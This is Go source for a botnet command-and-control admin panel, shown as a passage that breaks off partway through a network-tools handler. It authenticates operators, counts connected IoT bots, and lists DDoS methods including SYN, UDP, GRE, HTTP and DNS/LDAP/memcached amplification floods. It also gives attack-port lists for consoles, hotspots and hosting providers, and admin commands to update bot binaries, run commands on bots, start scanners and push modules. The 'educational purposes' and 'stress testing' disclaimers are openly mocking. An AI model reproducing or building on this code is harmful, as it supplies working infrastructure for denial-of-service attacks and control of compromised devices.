package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

type Admin struct {
	conn     net.Conn
	username string
	R        *Render
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn, "", NewRender(conn)}
}

func (this *Admin) writeBanner() {
	this.conn.Write([]byte(CCls))
	this.conn.Write([]byte("\r\n" +
		CPink + "  ███████╗███████╗███╗   ███╗██████╗  ██████╗ ██╗   ██╗\r\n" +
		CPink + "  ██╔════╝██╔════╝████╗ ████║██╔══██╗██╔═══██╗╚██╗ ██╔╝\r\n" +
		CPink + "  █████╗  █████╗  ██╔████╔██║██████╔╝██║   ██║ ╚████╔╝ \r\n" +
		CPink + "  ██╔══╝  ██╔══╝  ██║╚██╔╝██║██╔══██╗██║   ██║  ╚██╔╝  \r\n" +
		CPink + "  ██║     ███████╗██║ ╚═╝ ██║██████╔╝╚██████╔╝   ██║   \r\n" +
		CPink + "  ╚═╝     ╚══════╝╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n" +
		CGray + "  ███╗   ██╗███████╗████████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗\r\n" +
		CGray + "  ████╗  ██║██╔════╝╚══██╔══╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝\r\n" +
		CGray + "  ██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ \r\n" +
		CGray + "  ██║╚██╗██║██╔══╝     ██║   ██║███╗██║██║   ██║██╔══██╗██╔═██╗ \r\n" +
		CGray + "  ██║ ╚████║███████╗   ██║   ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗\r\n" +
		CGray + "  ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝\r\n" +
		CReset + "\r\n"))
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()

	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\033[38;5;202m \r\n"))
	this.R.LoginPrompt()
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.R.PassPrompt()
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}

	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\r\n"))

	this.username = username

	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
		this.conn.Write([]byte("\r\033[0;91mCheck your login Info\r\n"))
		this.conn.Write([]byte("\033[0;91mSubby if this is you dont even try\033[0m"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			time.Sleep(time.Second)
			if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d IoT | %s\007", BotCount, username))); err != nil {
				this.conn.Close()
				break
			}
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()

	this.writeBanner()
	online := clientList.Count()
	if userInfo.maxBots != -1 && online > userInfo.maxBots {
		online = userInfo.maxBots
	}
	this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;240m  online: \x1b[97m%d\x1b[0m  |  help / methods\r\n\r\n", online)))

	var cmdHistory []string
	for {
		var botCatagory string
		var botCount int
		this.R.PromptWithCount(this.username, clientList.Count())
		cmd, err := this.ReadLineWithHistory(false, &cmdHistory)

		if cmd == "clear" || cmd == "cls" || cmd == "c" || cmd == "CLS" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.writeBanner()
			continue
		}
		if err != nil || cmd == "exit" || cmd == "quit" {
			return
		}
		if cmd == "" {
			continue
		}
		if cmd != "exit" && cmd != "quit" {
			cmdHistory = append(cmdHistory, cmd)
			if len(cmdHistory) > 100 {
				cmdHistory = cmdHistory[len(cmdHistory)-100:]
			}
		}
		botCount = userInfo.maxBots

		if err != nil || cmd == "METHODS" || cmd == "methods" || cmd == "attack" || cmd == "DDOS" || cmd == "ddos" || cmd == "ATTACK" {
			this.conn.Write([]byte("\x1b[38;5;52m TCP  - syn, ack, usyn, tcpall, frag, asyn, socket, orbitv3, nfolag, connect\r\n"))
			this.conn.Write([]byte("\x1b[38;5;52m UDP  - plain, std, cudp, dns, ldap, chargen, memcached\r\n"))
			this.conn.Write([]byte("\x1b[38;5;52m GRE  - greip, greeth, mptcpgre, grestack\r\n"))
			this.conn.Write([]byte("\x1b[38;5;52m L7   - http, scanports\r\n"))
			this.conn.Write([]byte("\x1b[38;5;240m e.g. syn 1.2.3.4 60 dport=80 burst=16\r\n"))
			continue
		}

		if err != nil || cmd == "TCP" || cmd == "tcp" {
			this.conn.Write([]byte("\x1b[38;5;202m ╔═════════════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m syn [ip] [time] [dport=80 ...]       - syn           \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m usyn [ip] [time] [dport=80 ...]      - usyn          \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m ack [ip] [time] [dport=80 ...]       - ack           \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m tcpall [ip] [time] [dport=80 ...]    - tcpall        \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m frag [ip] [time] [dport=80 ...]      - frag          \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m asyn [ip] [time] [dport=80 ...]      - asyn          \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m socket [ip] [time] [dport=80 ...]    - socket        \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m orbitv3 [ip] [time] [burst=4 ...]    - orbitv3       \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m nfolag [ip] [time] [usyn=0|1 ...]    - nfolag        \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m connect [ip] [time] dport=80 conns=256 - exhaustion  \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m FLAGS - full flag list                               \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ╚═════════════════════════════════════════════════════╝\r\n"))
			continue
		}

		if err != nil || cmd == "UDP" || cmd == "udp" {
			this.conn.Write([]byte("\x1b[38;5;202m ╔═════════════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m plain [ip] [time] [dport=80 len=4096] - plain         \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m std [ip] [time] [dport=80 len=1024]  - std           \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m cudp [ip] [time] [dport=80 ...]       - cudp          \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m dns [ip] [time] dport=53 domain=x.com - dns           \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m ldap [ip] [time] dport=389 len=512   - ldap amplify  \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m chargen [ip] [time] dport=19         - chargen       \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m memcached [ip] [time] dport=11211    - memcached     \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ╚═════════════════════════════════════════════════════╝\r\n"))
			continue
		}

		if err != nil || cmd == "GRE" || cmd == "gre" {
			this.conn.Write([]byte("\x1b[38;5;202m ╔═════════════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m greip [ip] [time] [dport=80 ...]      - greip        \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m greeth [ip] [time] [dport=80 ...]     - gre eth      \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m mptcpgre [ip] [time] [burst=64 ...]   - mptcpgre     \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m grestack [ip] [time] [burst=32 ...]   - gre stack    \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ╚═════════════════════════════════════════════════════╝\r\n"))
			continue
		}

		if err != nil || cmd == "L7" || cmd == "l7" || cmd == "layer7" || cmd == "LAYER7" {
			this.conn.Write([]byte("\x1b[38;5;202m ╔═════════════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m http [ip] [time] domain=[ip] conns=[300]    - http \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m scanports [ip] [1] ports=80,443,23         - scan  \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ╚═════════════════════════════════════════════════════╝\r\n"))
			continue
		}

		if err != nil || cmd == "FLAGS" || cmd == "flags" {
			this.conn.Write([]byte("\x1b[38;5;202m ╔══════════════════════════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m attack method ip time [flag1=val1 flag2=val2 ...]       \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m or method ip time ?  - flags for this method           \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ╠══════════════════════════════════════════════════════════════════╣\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m len=512     - payload size (bytes)                      \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m rand=1|0   - randomize payload                          \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m tos=0       - IP TOS                                   \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m ident=0    - IP ID (65535=random)                       \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m ttl=64     - IP TTL                                    \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m df=1|0     - don't fragment                             \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m sport=0    - source port (0/65535=random)               \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m dport=80   - dest port                                 \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m burst=4    - orbitv3/mptcpgre/grestack burst             \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m usyn=0|1   - nfolag: 0=asyn 1=usyn                      \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m domain=x   - dns: query domain                        \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m conns=256  - connect: parallel conns                   \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m ports=80,443 - scanports port list                      \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m source=ip  - spoof source (admin)                       \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ╚══════════════════════════════════════════════════════════════════╝\r\n"))
			continue
		}

		if err != nil || cmd == "HELP" || cmd == "help" || cmd == "?" {
			this.conn.Write([]byte("\x1b[38;5;202m METHODS  - attack categories (TCP/UDP/GRE/L7)\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m FLAGS    - attack flags help\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m COUNT    - online bots\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m INFO     - your limits\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m HISTORY  - last attacks (history up = asc)\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m PORTS    - common ports\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m TOOLS    - ping, whois, resolve...\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ADMIN    - admin commands (admin only)\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m CLS/c    - clear screen\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m -N cmd   - limit to N bots, e.g. -100 syn 1.2.3.4 60\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m @src cmd - filter by source, e.g. @x86 plain 1.2.3.4 60\r\n"))
			continue
		}

		if err != nil || cmd == "TOOLS" || cmd == "tools" {
			this.conn.Write([]byte("\x1b[38;5;202m ╔══════════════════════════════════╗ \r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m PING     - Pngs an IP            \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m IPLOOKUP - Shows IP info         \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m WHOIS    - Runs a WHOIS check    \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m TRACER   - Traceroute on IP      \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m RESOLVE  - Resolves Domain       \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m REVDNS   - Shows DNS of IP       \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m ASNLOOKUP- Shows ASN of IP       \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m SUBCALC  - Calculates Subnet     \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m ZTRANSF  - Shows ZoneTransfer    \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m SCANPORTS- Port scan via bots    \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m EXPLOITS - Last exploit findings  \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m HISTORY  - Attack history up/down \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ╚══════════════════════════════════╝\r\n"))
			continue
		}

		if err != nil || cmd == "EXPLOITS" || cmd == "exploits" {
			f, err := os.Open("sl_exploits.txt")
			if err != nil {
				this.conn.Write([]byte("\x1b[38;5;240mNo exploits file or empty\x1b[0m\r\n"))
				continue
			}
			var lines []string
			sc := bufio.NewScanner(f)
			for sc.Scan() {
				lines = append(lines, sc.Text())
			}
			f.Close()
			n := len(lines)
			if n == 0 {
				this.conn.Write([]byte("\x1b[38;5;240mNo exploit findings yet\x1b[0m\r\n"))
				continue
			}
			start := 0
			if n > 20 {
				start = n - 20
			}
			this.conn.Write([]byte("\x1b[38;5;52m--- last exploit findings ---\x1b[38;5;240m\r\n"))
			for i := start; i < n; i++ {
				this.conn.Write([]byte(lines[i] + "\r\n"))
			}
			continue
		}

		if err != nil || strings.HasPrefix(strings.ToLower(cmd), "history") {
			asc := false
			if strings.Contains(strings.ToLower(cmd), " up") {
				asc = true
			}
			hist, err := database.GetAttackHistory(username, 20, asc)
			if err != nil {
				this.conn.Write([]byte("\x1b[38;5;196mError\x1b[38;5;240m\r\n"))
				continue
			}
			this.conn.Write([]byte("\x1b[38;5;52m\x1b[48;5;232m"))
			this.conn.Write([]byte("\x1b[38;5;196m time\t\tdur\tcmd\tbots\x1b[38;5;240m\r\n"))
			for _, h := range hist {
				t := time.Unix(int64(0), 0)
				if ts, e := strconv.ParseInt(h["time"], 10, 64); e == nil {
					t = time.Unix(ts, 0)
				}
				this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;240m%s\t%s\t%s\t%s\x1b[0m\r\n", t.Format("15:04 2Jan"), h["duration"], h["command"], h["max_bots"])))
			}
			continue
		}

		if err != nil || cmd == "PORTS" || cmd == "ports" {
			this.conn.Write([]byte("\x1b[38;5;202m ╔════════════════════════════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m HOTSPOT PORTS:                     VERIZON 4G LTE:                 \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m UDP - 1900                         UDP - 53, 123, 500, 4500, 52248 \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m TCP - 2859, 5000                   TCP - 53                        \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║                                                                    \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m AT&T Wi-Fi HOTSPOTS                ATTACK PORTS:                   \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97mUDP - 137, 138, 139, 445, 8053     699 Good For Hotspots            \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97mTCP - 1434, 8053, 8083, 8084       5060 Router Reset Port           \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║                                                                    \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m GENERAL PORTS:                                                     \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m HOME: 80, 53, 22, 8080             Please do not Abuse             \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m XBOX: 3074                          Any of our tools               \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m PS4: 9307                            As they are here              \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m PS3:                                   Just for                    \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m  -TCP:3478, 3479, 3480, 5223            Educational Purposes       \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m  -UDP:3478, 3479                            ONLY!                  \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m HOTSPOT: 9286                                                      \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m VPN: 7777                              OwO                         \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m NFO: 1192                                                          \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m OVH: 992                                                           \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m HTTP: 80, 8080,443                                                \x1b[38;5;202m ║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ╚════════════════════════════════════════════════════════════════════╝\r\n"))
			continue
		}

		if err != nil || cmd == "admin" || cmd == "ADMIN" {
			this.conn.Write([]byte("\x1b[38;5;202m \x1b[38;5;52madmin commands\x1b[38;5;202m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m  ADDUSER     - add user\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m  ADDADMIN    - add admin (*ADDADMIN*)\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m  RMUSER      - remove user\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m  USERS       - list users\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m  BOTS        - distribution + count\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m  UPDATE      - update bot binary (all/arch)\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m  SELFUPDATE  - run cmd on bots\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m  SCANSTART   - start scanners\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m  SCANSTOP    - stop scanners\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m  STOP        - stop attacks\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m  SENDMODULE  - send .so module to all bots\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m  CALLMODULE  - call function in loaded module\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m  LISTMODULES - list loaded modules on bots\r\n"))
			continue
		}

		if err != nil || cmd == "INFO" || cmd == "info" {
			online := clientList.Count()
			if userInfo.maxBots != -1 && online > userInfo.maxBots {
				online = userInfo.maxBots
			}
			this.conn.Write([]byte("\x1b[38;5;202m ----------------------------------------\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202m  \x1b[1;97mUser: \x1b[38;5;202m%s\r\n", username)))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202m  \x1b[1;97mOnline: \x1b[38;5;202m%d\r\n", online)))
			mbStr := fmt.Sprintf("%d", userInfo.maxBots)
			if userInfo.maxBots < 0 {
				mbStr = "unlimited"
			}
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202m  \x1b[1;97mMax bots: \x1b[38;5;202m%s\r\n", mbStr)))
			durStr := "none"
			if userInfo.durationLimit > 0 {
				durStr = fmt.Sprintf("%ds", userInfo.durationLimit)
			} else if userInfo.durationLimit == 0 {
				durStr = "0 (blocked)"
			}
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202m  \x1b[1;97mMax duration: \x1b[38;5;202m%s\r\n", durStr)))
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202m  \x1b[1;97mCooldown: \x1b[38;5;202m%ds\r\n", userInfo.cooldown)))
			this.conn.Write([]byte("\x1b[38;5;202m ----------------------------------------\r\n"))
			continue
		}

		if err != nil || cmd == "COUNT" || cmd == "count" {
			online := clientList.Count()
			if userInfo.maxBots != -1 && online > userInfo.maxBots {
				online = userInfo.maxBots
			}
			this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;202mOnline: \x1b[1;97m%d\x1b[0m\r\n", online)))
			continue
		}

		if err != nil || cmd == "RULES" || cmd == "rules" {
			this.conn.Write([]byte("\x1b[38;5;202m ╔═════════════════════════════════════╗ \r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m DO NOT SPAM ATTACKS !               \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m DO NOT SHARE LOGINS !(IP is logged) \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m DO NOT ATTACK GOVERNMENTS !         \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m ONLY USE FOR sTrEsS tEsTiNg :)      \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ║\x1b[1;97m 3 Warnings = Ban                    \x1b[38;5;202m║\r\n"))
			this.conn.Write([]byte("\x1b[38;5;202m ╚═════════════════════════════════════╝\r\n"))
			continue
		}

		botCount = userInfo.maxBots

		if err != nil || cmd == "logout" || cmd == "LOGOUT" {
			return
		}

		parts := strings.Fields(cmd)
		baseCmd := ""
		toolArg := ""
		if len(parts) > 0 {
			baseCmd = strings.ToUpper(parts[0])
			if len(parts) > 1 {
				toolArg = strings.TrimSpace(strings.Join(parts[1:], " "))
			}
		}

		getToolIP := func(prompt string) (string, error) {
			if toolArg != "" {
				return toolArg, nil
			}
			this.conn.Write([]byte("\x1b[96m" + prompt + "\x1b[97m: \x1b[97m"))
			return this.ReadLine(false)
		}

		if baseCmd == "IPLOOKUP" {
			locipaddress, err := getToolIP("IP Address")
			if err != nil {
				return
			}
			url := "http://ip-api.com/line/" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
			continue
		}

		if baseCmd == "WHOIS" {
			locipaddress, err := getToolIP("IP or domain")
			if err != nil {
				return
			}
			url := "http://ip-api.com/line/" + locipaddress + "?fields=status,country,regionName,city,isp,org,as,query"
			tr := &http.Transport{ResponseHeaderTimeout: 5 * time.Second, DisableCompression: true}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			resp, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError: %v\033[37;1m\r\n", err)))
				continue
			}
			data, _ := ioutil.ReadAll(resp.Body)
			resp.Body.Close()
			locformatted := strings.Replace(strings.TrimSpace(string(data)), "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
			continue
		}

		if baseCmd == "PING" {
			locipaddress, err := getToolIP("IP Address")
			if err != nil {
				return
			}
			out, err := runLocalCmd("ping", "-c", "4", locipaddress)
			if err != nil {
				out, _ = runLocalCmd("ping", "-n", "4", locipaddress)
			}
			locformatted := strings.Replace(out, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
			continue
		}

		if baseCmd == "TRACER" {
			locipaddress, err := getToolIP("IP Address")
			if err != nil {
				return
			}
			out, err := runLocalCmd("traceroute", "-n", locipaddress)
			if err != nil {
				out, _ = runLocalCmd("tracert", locipaddress)
			}
			locformatted := strings.Replace(out, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
			continue
		}

		if baseCmd == "RESOLVE" {
			locipaddress, err := getToolIP("Domain (without www)")
			if err != nil {
				return
			}
			out, err := runLocalCmd("host", locipaddress)
			if err != nil {
				out, err = runLocalCmd("nslookup", locipaddress)
			}
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError: %v\033[37;1m\r\n", err)))
				continue
			}
			locformatted := strings.Replace(out, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
			continue
		}

		if baseCmd == "REVDNS" {
			locipaddress, err := getToolIP("IP Address")
			if err != nil {
				return
			}
			out, err := runLocalCmd("host", locipaddress)
			if err != nil {
				out, err = runLocalCmd("nslookup", locipaddress)
			}
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError: %v\033[37;1m\r\n", err)))
				continue
			}
			locformatted := strings.Replace(out, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
			continue
		}

		if baseCmd == "ASNLOOKUP" {
			locipaddress, err := getToolIP("IP Address")
			if err != nil {
				return
			}
			url := "http://ip-api.com/line/" + locipaddress
			tr := &http.Transport{ResponseHeaderTimeout: 5 * time.Second, DisableCompression: true}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError\033[37;1m\r\n")))
				continue
			}
			locresponsedata, _ := ioutil.ReadAll(locresponse.Body)
			locresponse.Body.Close()
			locformatted := strings.Replace(string(locresponsedata), "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
			continue
		}

		if baseCmd == "SUBCALC" {
			locipaddress, err := getToolIP("IP/CIDR (e.g. 192.168.1.0/24)")
			if err != nil {
				return
			}
			out, err := runLocalCmd("ipcalc", locipaddress)
			if err != nil {
				out, err = runLocalCmd("sipcalc", locipaddress)
			}
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[91mError: ipcalc/sipcalc not found\033[37;1m\r\n")))
				continue
			}
